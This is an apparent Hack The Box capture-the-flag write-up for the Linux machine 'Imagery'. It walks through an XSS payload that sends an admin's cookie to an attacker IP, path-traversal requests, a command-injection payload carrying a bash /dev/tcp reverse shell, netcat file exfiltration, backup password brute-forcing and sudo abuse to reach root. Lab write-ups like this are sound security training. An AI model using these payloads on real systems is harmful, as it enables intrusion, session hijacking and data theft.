---
title: "HTB Machine Imagery"
date: 2025-10-01T20:18:11+02:00
draft: false 
tags: ["hackthebox", "writeup", "linux", "medium", "season 9"]
categories: ["CTF"]
---
## Machine Information

| Attribute | Details |
|-----------|---------|
| **Name** | Imagery |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.11.88 |
| **Release Date** | 2025 |

---

## TL;DR

Imagery is a Medium Linux machine featuring a Python web application with multiple vulnerabilities. The attack chain involves:

1. **XSS** → Steal admin session cookie via bug report
2. **LFI** → Read sensitive files including `db.json`
3. **Command Injection** → RCE via image transformation parameter
4. **AES-encrypted backup** → Brute-force to recover credentials
5. **Privilege Escalation** → Abuse `charcol` backup tool sudo privileges

---

## Enumeration

### Port Scan

```bash
nmap -T4 -A -v 10.10.11.88
```

**Open Ports:**
- `22/tcp` - SSH (OpenSSH)
- `8000/tcp` - HTTP (Werkzeug/Python)

### Web Application

Accessed `http://imagery.htb:8000/` and discovered an image gallery application with:
- User registration/login functionality
- Image upload feature
- Image transformation operations (crop/resize)
- Bug report submission form

---

## Initial Access

### Step 1: XSS → Admin Session Cookie Theft

**Vulnerability:** The bug report form accepts unsanitized HTML input.

**Exploitation:**

1. Start a listener to capture cookies:
```bash
nc -lvnp 8080
```

2. Submit XSS payload via bug report:
```html
<img src=1 onerror="document.location='http://<ATTACKER-IP>:8080/'+document.cookie">
```

3. Wait for admin to view the report
4. Capture the admin session cookie from your listener
5. Inject cookie in browser (DevTools → Application → Cookies)

**Result:** Gained admin panel access

---

### Step 2: LFI → Extract Sensitive Files

**Vulnerability:** The log download endpoint concatenates user input without sanitization.

**Test Request:**
```http
GET /admin/get_system_log?log_identifier=../../../../../etc/passwd HTTP/1.1
```

**Extract Database:**
```http
GET /admin/get_system_log?log_identifier=../../../../../path/to/db.json HTTP/1.1
```

**Result:** Retrieved `db.json` containing password hashes

**Credential Recovered:**
```
testuser@imagery.htb:iambatman
```

---

### Step 3: RCE via Command Injection

**Vulnerability:** The `x` parameter in image transformation is passed unsafely to a shell command.

**Exploitation:**

1. Login as `testuser@imagery.htb:iambatman`
2. Upload any image file
3. Navigate to Image Gallery → 3 dots → Transform Image
4. Select "Crop" operation
5. Intercept the transformation request in Burp Suite
6. Modify the payload:

```json
{
  "imageId": "<image-uuid>",
  "transformType": "crop",
  "params": {
    "x": ";setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1';",
    "y": 0,
    "width": 640,
    "height": 640
  }
}
```

7. Start listener:
```bash
nc -lvnp 4444
```

8. Forward the modified request

**Result:** Reverse shell as web application user

---

## Privilege Escalation to User

### Step 4: Decrypt AES Backup

**Discovery:** Found encrypted backup file during enumeration:
```bash
ls -la /var/backup/
# -rw-r--r-- 1 root root web_20250806_120723.zip.aes
```

**Transfer the file:**

Method 1 - Netcat:
```bash
# Attacker
nc -lvnp 4444 > web_20250806_120723.zip.aes

# Target
nc <ATTACKER-IP> 4444 < /var/backup/web_20250806_120723.zip.aes
```

**Brute-force decryption:**

The file is AES-Crypt v2 format. Use the following Python script with rockyou.txt:

```bash
python3 pyaescrypt_bruteforce.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt -o decrypted.zip -j 4
```

**Password found:** `bestfriends`

**Extract and analyze:**
```bash
unzip decrypted.zip
cat db.json
```

**Credential recovered:**
```
mark:supersmash
```

### Get User Shell

**Switch user:**
```bash
su mark
# Password: supersmash
```

**Retrieve user flag:**
```bash
cat /home/mark/user.txt
```

---

## Privilege Escalation to Root

### Step 5: Abuse charcol Sudo Privileges

**Check sudo privileges:**
```bash
sudo -l
```

**Output:**
```
User mark may run the following commands:
    (root) /usr/local/bin/charcol
```

**Analysis:** `charcol` is a backup tool with:
- Interactive shell mode
- Password reset functionality (`-R` flag)
- Task scheduling feature (`auto add`)

### Method 1: Schedule Task to Copy Root Flag

**Reset charcol password:**
```bash
sudo /usr/local/bin/charcol -R
```

**Launch charcol shell:**
```bash
sudo /usr/local/bin/charcol shell
# Press Enter for no password mode
# Confirm with 'yes'
```

**Schedule recurring job:**
```
auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt" --name "get_flag"
exit
```

**Wait one minute, then:**
```bash
cat /tmp/root.txt
```

### Method 2: SUID Bash (Alternative)

**Launch charcol shell:**
```bash
sudo /usr/local/bin/charcol shell
# Password: supersmash
```

**Schedule SUID bash:**
```
auto add --schedule "* * * * *" --command "chmod +s /usr/bin/bash" --name "suidbash"
exit
```

**Wait for the cron job to execute (1-2 minutes)**

**Spawn root shell:**
```bash
/usr/bin/bash -p
whoami  # root
cat /root/root.txt
```

---

## Automated Exploit Script

For faster exploitation, use this automated Python script:

```bash
# Create shell.sh on attacker machine
echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/9001 0>&1' > shell.sh

# Start Python HTTP server
python3 -m http.server 8000

# Start listener
nc -lvnp 9001

# Run exploit
python3 exploit.py image.png --lhost <ATTACKER-IP> --lport 8000 --target http://10.10.11.88:8000
```

---

## Attack Chain Summary

```
Web Application (Port 8000)
    ↓
XSS in Bug Report → Admin Cookie Theft
    ↓
Admin Panel Access
    ↓
LFI in Log Download → db.json
    ↓
Crack Hash → testuser:iambatman
    ↓
Login → Upload Image
    ↓
Command Injection in Transform → Reverse Shell
    ↓
Enumerate System → Find AES Backup
    ↓
Brute-force AES → bestfriends
    ↓
Extract db.json → mark:supersmash
    ↓
Switch User → mark
    ↓
Sudo -l → /usr/local/bin/charcol
    ↓
Abuse charcol Scheduler → Root Access
```

---

## Key Vulnerabilities

| Vulnerability | Impact | CVSS |
|--------------|---------|------|
| XSS in Bug Report | Session Hijacking | 7.4 |
| Path Traversal (LFI) | Information Disclosure | 7.5 |
| Command Injection | Remote Code Execution | 9.8 |
| Weak AES Password | Credential Exposure | 6.5 |
| Sudo Misconfiguration | Privilege Escalation | 8.8 |

---

## Lessons Learned

### Security Issues

1. **Insufficient Input Validation**
   - No HTML sanitization in bug report form
   - Path traversal not blocked in file download
   - Command injection in transformation parameters

2. **Weak Encryption**
   - Weak password on AES-encrypted backup
   - Password crackable with rockyou.txt

3. **Privilege Escalation**
   - Dangerous sudo permissions on backup tool
   - Task scheduler runs with elevated privileges
   - No input validation in scheduled commands

### Attack Techniques (MITRE ATT&CK)

- **T1059.004** - Command and Scripting Interpreter: Unix Shell
- **T1185** - Browser Session Hijacking (XSS)
- **T1083** - File and Directory Discovery
- **T1552.001** - Unsecured Credentials: Credentials In Files
- **T1548.003** - Abuse Elevation Control Mechanism: Sudo

---
## Conclusion

Imagery demonstrates a realistic attack chain through a vulnerable web application. The machine emphasizes:

- The danger of unsanitized user input (XSS, LFI, Command Injection)
- Importance of strong encryption passwords
- Risks of overly permissive sudo configurations
- Value of defense-in-depth security controls

Key takeaway: **Every user input is a potential attack vector** and must be properly validated, sanitized, and escaped.

